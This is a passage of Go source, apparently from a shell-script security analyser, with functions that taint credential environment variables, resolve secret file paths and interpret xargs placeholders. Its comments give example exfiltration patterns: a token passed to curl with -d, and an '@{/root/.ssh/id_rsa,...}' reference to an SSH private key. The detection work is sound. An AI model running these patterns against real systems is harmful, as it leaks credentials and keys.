	v := it.state.Get(name)
	return v == nil || !v.Set
}

// envCredentialTaint returns the secret label when a word reads a credential
// held in the environment, so the value it expands to is credential material:
// x=$GITHUB_TOKEN, then curl -d "$x", keeps the provenance end to end.
func (it *interp) envCredentialTaint(w *syntax.Word) engine.Taint {
	found := false
	it.walkEnvReadParts(w, func(name string, _ Pos) {
		if !found && it.envSecretName(name) {
			found = true
		}
	})
	if found {
		return engine.TaintOf(engine.TaintSecret)
	}
	return engine.TaintBottom()
}

// walkEnvReadParts invokes emit for every parameter expansion in the word. It
// descends into double quotes (the common spelling) and does not descend into
// command or process substitutions: those are executed as their own commands
// and report their reads themselves.
func (it *interp) walkEnvReadParts(w *syntax.Word, emit func(string, Pos)) {
	if w == nil {
		return
	}
	pos := fromMvdanPos(w.Pos())
	var walk func(parts []syntax.WordPart)
	walk = func(parts []syntax.WordPart) {
		for _, p := range parts {
			switch p := p.(type) {
			case *syntax.ParamExp:
				if p.Param != nil {
					emit(p.Param.Value, pos)
				}
			case *syntax.DblQuoted:
				walk(p.Parts)
			}
		}
	}
	walk(w.Parts)
}

// credentialPathOf resolves one operand's text to a credential path: the first
// path-shaped fragment of the text that names a secret location, either as
// written (absolute, or carrying a credential prefix) or relative to the shell's
// current directory. relativeOnly restricts the resolution to the
// current-directory form, which is what a literal operand still needs.
func (it *interp) credentialPathOf(text string, relativeOnly bool) (string, bool) {
	if text == "" || strings.HasPrefix(text, "-") {
		return "", false
	}
	for _, frag := range pathFragments(text) {
		if !relativeOnly && engine.SecretPath(frag) {
			return frag, true
		}
		if it.state.PWD != "" && !strings.HasPrefix(frag, "/") {
			if j := path.Join(it.state.PWD, frag); engine.SecretPath(j) {
				return j, true
			}
		}
	}
	return "", false
}

// pathFragments splits an operand's text into the path-shaped fragments it can
// name: shell grouping punctuation (braces, commas, a file-reference '@', a
// leading glob escape) separates fragments, so `@{/root/.ssh/id_rsa,$?}` yields
// `/root/.ssh/id_rsa`.
func pathFragments(text string) []string {
	out := make([]string, 0, 2)
	var b strings.Builder
	flush := func() {
		if s := strings.TrimPrefix(b.String(), "@"); s != "" {
			out = append(out, s)
		}
		b.Reset()
	}
	for _, r := range text {
		switch r {
		case '{', '}', ',', '\'', '"', '=':
			flush()
		case '@':
			flush()
		default:
			b.WriteRune(r)
		}
	}
	flush()
	return out
}

// isFdWord reports whether a redirect word names a file descriptor (all digits,
// or "-" for a closed/duplicated stream), as opposed to a file path.
func isFdWord(w *syntax.Word) bool {
	v, ok := literalOf(w)
	if !ok {
		return false
	}
	if v == "-" {
		return true
	}
	if v == "" {
		return false
	}
	for i := 0; i < len(v); i++ {
		if v[i] < '0' || v[i] > '9' {
			return false
		}
	}
	return true
}

// wrapperText renders a wrapper chain (outermost first) for a derivation atom.
func wrapperText(ws []*Wrapper) string {
	names := make([]string, 0, len(ws))
	for _, w := range ws {
		if w != nil {
			names = append(names, w.Name)
		}
	}
	return strings.Join(names, " ")
}

// xargsPlaceholderPathish reports whether the replacement placeholder occupies
// a path position in an operand: the whole operand, the payload after a
// file-reference `@`, an `=`-separated option value, or a component of a
// slash-separated path. Only then does the substituted item name a file the
// command opens; a placeholder embedded in a plain word — an `-Ie` replacement
// matching the letter e of `file` — is data, not a path (Finding 92).
func xargsPlaceholderPathish(operand, repl string) bool {
	switch {
	case operand == repl,
		operand == "@"+repl,
		strings.HasPrefix(operand, repl+"/"),
		strings.Contains(operand, "/"+repl),
		strings.Contains(operand, "@"+repl),
		strings.Contains(operand, "="+repl):
		return true
	}
	return false
}

// xargsPlaceholder returns the -I/-i/--replace replacement string declared by an
// xargs wrapper, if any. The placeholder is a stand-in for the (unknown) input
// items, so an operand carrying it must widen the target to ⊤ rather than be
// taken as a concrete path.
func xargsPlaceholder(wrappers []*Wrapper) (string, bool) {
	for _, w := range wrappers {
		if w == nil || w.Name != WrapXargs {
			continue
		}
		for i := 0; i < len(w.Options); i++ {
			opt := w.Options[i]
			switch {
			case opt == "-I" || opt == "-i" || opt == "--replace":
				if i+1 < len(w.Options) {
					return w.Options[i+1], true
				}
			case strings.HasPrefix(opt, "-I") && len(opt) > 2:
				return opt[2:], true
			case strings.HasPrefix(opt, "--replace="):
				return strings.TrimPrefix(opt, "--replace="), true
			}
		}
	}
	return "", false
}
